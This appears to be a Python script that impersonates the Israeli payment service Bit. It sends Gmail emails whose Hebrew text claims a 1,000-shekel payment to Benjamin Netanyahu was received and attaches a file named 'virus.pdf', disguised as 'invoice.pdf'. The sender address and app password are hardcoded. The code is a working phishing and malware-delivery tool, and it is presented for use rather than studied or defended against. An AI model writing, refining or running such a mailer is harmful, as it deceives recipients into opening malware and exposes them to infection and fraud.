import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

SENDER_EMAIL = "bit.il.invoice@gmail.com"
PASSWORD = "rxvr sgdi cmec oalf"
SUBJECT = "bit - הכסף שהעברת בביט לביבי נתניהו התקבל בהצלחה!"
BODY = "שלום רב,\nהכסף שהעברת בביט לביבי נתניהו על סך 1,000 שקלים התקבל בהצלחה!\nמצורפת חשבונית למייל זה"
VIRUS_NAME = "invoice.pdf"
VIRUS_FILE = os.path.abspath(os.path.dirname(__file__) + '/virus.pdf')


# ---------------------------------------------------------------------------------------------------------------

def send_email(email: str):
    message = MIMEMultipart()
    message["From"] = SENDER_EMAIL
    message["To"] = email
    message["Subject"] = SUBJECT
    message.attach(MIMEText(BODY, "plain"))

    with open(VIRUS_FILE, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {VIRUS_NAME}",
    )
    message.attach(part)

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(SENDER_EMAIL, PASSWORD)
        server.sendmail(SENDER_EMAIL, email, message.as_string())
